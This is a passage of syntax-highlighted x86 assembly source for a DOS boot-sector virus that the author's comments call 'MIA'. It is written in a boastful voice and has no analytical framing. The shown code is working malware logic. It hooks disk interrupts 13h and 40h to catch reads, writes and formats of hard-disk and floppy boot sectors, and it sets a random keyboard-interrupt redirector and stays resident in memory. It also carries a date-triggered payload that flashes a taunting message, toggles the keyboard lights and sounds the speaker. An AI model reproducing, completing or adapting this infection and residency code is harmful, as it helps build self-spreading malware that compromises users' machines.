 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Survive</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Set its vector</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04EEh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; (0000h:04EEh) INT ??</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">04EEh</span><span class="sc0">               </span><span class="sc1">; So INT 09h points at 0000h:04EEh</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Keyboard</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Keyboard</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0084h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Clear INT 21h vector</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; Reset both FD &amp; HD</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">; Enable interrupts</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">13h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">               </span><span class="sc1">; Now all that's left is original boot-record</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; execution</span><span class="sc0">

</span><span class="sc5">Condition</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Hike</span><span class="sc0">             </span><span class="sc1">; (Relative) not a bug!!</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">                           </span><span class="sc1">; Now boot from FD (maybe there's a disk in FDD)</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">40h</span><span class="sc0">                    </span><span class="sc1">; So even if the FD ain't infected yet, </span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; MIA's already resident in memory!!</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Payload</span><span class="sc0">                 </span><span class="sc1">; I say a prayer that CF is not set here, 8-)</span><span class="sc0">

</span><span class="sc5">Hike</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; Here we load original boot-record of this disk</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">7C3Bh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; 'cause MIA doesn't want the partition</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">7C3Dh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; code to be executed twice (by passing control</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">7C24h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; to BIOS BootStrap loader)</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">13h</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ This is the payload: display colourful string ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Here You go, MIA's payload,  it will be triggered on January 1st,  February</span><span class="sc0">
</span><span class="sc1">; 19th, August 17th, September 6th, December 25th when computer's booted from</span><span class="sc0">
</span><span class="sc1">; infected boot-record. Don't You hope this is a kinda destructive code, what</span><span class="sc0">
</span><span class="sc1">; it does is just displaying a message on the middle of screen then waits for</span><span class="sc0">
</span><span class="sc1">; user keystroke  and while waiting, the colour of text is changed on and on,</span><span class="sc0">
</span><span class="sc1">; blinks Num, Caps, and Scroll lock status,  speaker sound is also generated.</span><span class="sc0">
</span><span class="sc1">; Not very smart, 8-(, anyhow it will entertain some lamers... 8-)</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Payload</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F00h</span><span class="sc0">               </span><span class="sc1">; ???</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">1Ah</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Save boot drive number (is this necessary?)</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">1Ah</span><span class="sc0">                    </span><span class="sc1">; Get real-time clock date</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; ??</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FEFFh</span><span class="sc0">              </span><span class="sc1">; Is today first day in year? (January, 1st)</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Activate</span><span class="sc0">               </span><span class="sc1">; Yup, time to pay back</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0118h</span><span class="sc0">               </span><span class="sc1">; Mia's birthday? (February, 19th)</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Activate</span><span class="sc0">               </span><span class="sc1">; Oh, yes baby!!</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0716h</span><span class="sc0">               </span><span class="sc1">; Is today Indonesia's independence day?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Activate</span><span class="sc0">               </span><span class="sc1">; Why not? 8-)</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0805h</span><span class="sc0">               </span><span class="sc1">; or is it My birthday? (September, 6th)</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Activate</span><span class="sc0">               </span><span class="sc1">; Yeah, ho ho ho...</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1124h</span><span class="sc0">               </span><span class="sc1">; December, 25th?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Bootload</span><span class="sc0">               </span><span class="sc1">; Nope, let it go...</span><span class="sc0">
                               </span><span class="sc1">; Merry x-mas! don't forget to go to Church! 8-)</span><span class="sc0">
</span><span class="sc5">Activate</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                 </span><span class="sc1">; BIOS video function AH=0Fh, get current video</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; mode</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">               </span><span class="sc1">; Set up video mode 3</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; INT 10h AH=01h, set cursor text-mode shape</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">; CH = cursor start and option</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; "Hide the cursor"</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0417h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get keyboard status flags 1 &amp; 2</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Decrypt some bytes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0B07h</span><span class="sc0">               </span><span class="sc1">; Begin at row 11, column 7 (zero-based)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Note</span><span class="sc0">         </span><span class="sc1">; ES:[BP] = offset of message to display</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">Restart</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                  </span><span class="sc1">; BL = characters' attributes</span><span class="sc0">

</span><span class="sc5">Draw</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; Change colour each loop</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">                </span><span class="sc1">; Use attribute [01h..0Fh]</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Restart</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">   </span><span class="sc1">; Toggle Scroll Lock status</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Sound</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">; BIOS video function AH=13h, write string ES:BP</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">   </span><span class="sc1">; Toggle Num Lock status</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Insult</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Note</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                    </span><span class="sc1">; CX = size of message in bytes</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">; Toggle Caps Lock status</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Sound</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">16h</span><span class="sc0">                    </span><span class="sc1">; Check whether there's a keyboard keystroke or</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Draw</span><span class="sc0">                   </span><span class="sc1">; not, loop if not.</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">             </span><span class="sc1">; Restore keyboard status flags 1 &amp; 2</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1300h</span><span class="sc0">               </span><span class="sc1">; AL = 00h, cursor won't be updated </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Sound</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Insult</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0D1Fh</span><span class="sc0">               </span><span class="sc1">; Row 13, column 31 (zero-based)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Insult</span><span class="sc0">       </span><span class="sc1">; Display another string, 8-)</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Re-encrypt some bytes</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">05h</span><span class="sc0">                    </span><span class="sc1">; Dump screen text to first printer</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; BP = FFFFh</span><span class="sc0">

</span><span class="sc5">Waste</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">13h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; I'd rather spend My time with Mia than do</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">16h</span><span class="sc0">                    </span><span class="sc1">; this silly delay, 8-)</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                     
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Waste</span><span class="sc0">                  
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                  </span><span class="sc1">; Restore video mode</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc5">Bootload</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Restore boot drive number.</span><span class="sc0">
 </span><span class="sc6">retf</span><span class="sc0">                          </span><span class="sc1">; (0000h:7C00h)</span><span class="sc0">

</span><span class="sc5">FreeVector</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0088h</span><span class="sc0">               </span><span class="sc1">; 136 possible interrupts to use</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Random interrupt for INT 09h redirector</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">                 </span><span class="sc1">; 77h &lt; ?? </span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Fake_ROM</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">FreeVector</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Interstice</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">FreeVector</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Button</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; This is needed only by INT 09h</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Interrupt 13h handler ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Dualform</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0FFFAh</span><span class="sc0">

</span><span class="sc5">Black_Hole</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">                         </span><span class="sc1">; Store flags state</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Strategy</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; This is only for primary hard disk!</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Idle</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Malfunction</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Read function?</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Idle</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; Write function?</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Purport</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                 </span><span class="sc1">; Format function?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Signify</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; Read long sector(s)?</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Idle</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                 </span><span class="sc1">; Write long sector(s)?</span><span class="sc0">
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">Idle</span><span class="sc0">

</span><span class="sc5">Purport</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Evilution</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">

</span><span class="sc5">Value_5</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">   </span><span class="sc1">; Cylinder/sector of (infected) HD's active </span><span class="sc0">
                               </span><span class="sc1">; boot-record</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Signify</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Head of (infected) HD's active boot-record</span><span class="sc0">

</span><span class="sc5">Value_6</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Evilution</span><span class="sc0">              </span><span class="sc1">; Proceed if it's accessed</span><span class="sc0">

</span><span class="sc5">Signify</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                  </span><span class="sc1">; if not, do some checks again</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Idle</span><span class="sc0">                   </span><span class="sc1">; Accessing cylinder 0 ?</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                  </span><span class="sc1">; and head 0 ?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Evilution</span><span class="sc0">              

</span><span class="sc5">Idle</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Slick</span><span class="sc0">                  </span><span class="sc1">; Pass control to INT 13h handler</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Interrupt 40h handler ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Biform</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">

</span><span class="sc5">Malfunction</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Reading...?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Investigation</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                 </span><span class="sc1">; Writing...?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Investigation</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                 </span><span class="sc1">; Formatting...?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Needless</span><span class="sc0">

</span><span class="sc5">Investigation</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                  </span><span class="sc1">; First track of FD ?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Evilution</span><span class="sc0">              
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">                 </span><span class="sc1">; or track 80 ?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Evilution</span><span class="sc0">              

</span><span class="sc5">Needless</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Into_Disk</span><span class="sc0">              </span><span class="sc1">; Bring control to original INT 40h handler</span><span class="sc0">

</span><span class="sc5">Evilution</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">; Don't confuse direction</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
